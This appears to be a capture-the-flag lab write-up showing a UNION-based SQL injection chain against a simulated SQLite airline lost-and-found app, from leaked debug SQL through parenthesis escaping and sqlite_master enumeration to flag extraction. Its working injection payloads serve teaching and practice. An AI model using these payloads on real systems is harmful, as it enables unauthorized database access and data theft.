## AirlineLostFound - SQL Injection via UNION-Based Extraction, SQLite Enumeration, and Parenthesis Escaping


> x Exam (23)


### Lab Overview

This laboratory activity walks through a complete **SQL injection** attack chain against a simulated airline lost-and-found web application called _SkyRecover_. The vulnerability class is **classic UNION-based SQL injection**, compounded by an improperly balanced parenthesis structure in the backend query and debug output leaking the raw SQL to the client, a misconfiguration that dramatically accelerates exploitation.

---

### Phase 1 — Reconnaissance via Error-Based Leakage

The first indicator of vulnerability is the application returning a verbose database error directly in the HTTP response:

```
near "union": syntax error
[debug] query: SELECT li.item_description, li.location_found, ...
WHERE (li.passenger_name = ('[INPUT]') AND li.status = 'open')
```

> **Key Takeaway:** Debug output that exposes raw SQL queries is a critical misconfiguration. It transforms a blind injection scenario into a white-box one, revealing table aliases, column count, join structure, and the precise injection point.

From this leak, several facts are immediately extractable without any guessing. The query selects **8 columns**, uses a **JOIN** between `lost_items` and `flights`, and wraps the entire `WHERE` predicate in an outer parenthesis pair. The injection point is the `passenger_name` parameter, which is interpolated directly into the query without sanitization or parameterization.

---

### Phase 2 — Identifying the DBMS

The error message `near "union": syntax error` is characteristic of **SQLite**, which uses a strict parser and does not support MySQL-style comment syntax such as `#`. The double-dash `--` comment sequence is valid in SQLite and becomes the terminator of choice.

This distinction matters because SQLite lacks functions like `database()`, `user()`, or `@@version` found in MySQL or PostgreSQL. The version introspection function in SQLite is `sqlite_version()`, and schema enumeration relies entirely on the internal `sqlite_master` table rather than `information_schema`.

---

### Phase 3 — Escaping the Injection Context

The naive payload `') UNION SELECT ... --` fails because of the **unbalanced outer parenthesis**. Examining the query structure:

```sql
WHERE (li.passenger_name = ('INPUT') AND li.status = 'open')
--     ^                                                    ^
--     outer open paren                         outer close paren
```

A single `'` closes the string literal, and a single `)` closes the inner `passenger_name = (...)` grouping, but the outer parenthesis wrapping the entire `WHERE` clause remains open. The corrected escape sequence requires **two closing parentheses**:

```
')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

This produces a syntactically valid statement:

```sql
WHERE (li.passenger_name = ('')) UNION SELECT NULL,...--') AND li.status = 'open')
```

> **Key Takeaway:** Always map every opening parenthesis in the surrounding query context before constructing a UNION payload. A single unclosed paren is sufficient to invalidate the entire statement in strict parsers like SQLite's.

---

### Phase 4 — Schema Enumeration via `sqlite_master`

With a working injection context, the `sqlite_master` table serves as the single source of truth for the entire database schema. A single payload retrieves both table names and their full `CREATE` statements:

```sql
')) UNION SELECT name,sql,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

The response reveals four user-defined tables: `contact_requests`, `flights`, `lost_items`, and `restricted_items`, along with the internal `sqlite_sequence` table. The `CREATE` statement for `restricted_items` is immediately suspicious:

```sql
CREATE TABLE restricted_items (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  item_description TEXT NOT NULL,
  locker_code TEXT NOT NULL
)
```

The `locker_code` column is the target.

---

### Phase 5 — Data Extraction and Flag Recovery

With the schema confirmed, a direct extraction payload is constructed:

```sql
')) UNION SELECT item_description,locker_code,NULL,NULL,NULL,NULL,NULL,NULL FROM restricted_items--
```

The response returns multiple rows of restricted items alongside their locker codes. Among them, the row with `item_description = 'Sealed envelope marked CLASSIFIED'` contains the flag in the `locker_code` field:

```
offsec{un10n_p4r3n_br34k_587yt9Af7Zng1Hsm}
```

---

### Attack Chain Summary

```
1. Observe debug SQL leak in HTTP response
2. Identify DBMS as SQLite from error syntax
3. Count columns from leaked query (8 columns)
4. Construct balanced escape: ')) to close string + inner + outer paren
5. Append UNION SELECT with 8 NULLs and -- comment
6. Query sqlite_master to enumerate full schema
7. Identify restricted_items as the target table
8. Extract locker_code column to recover the flag
```

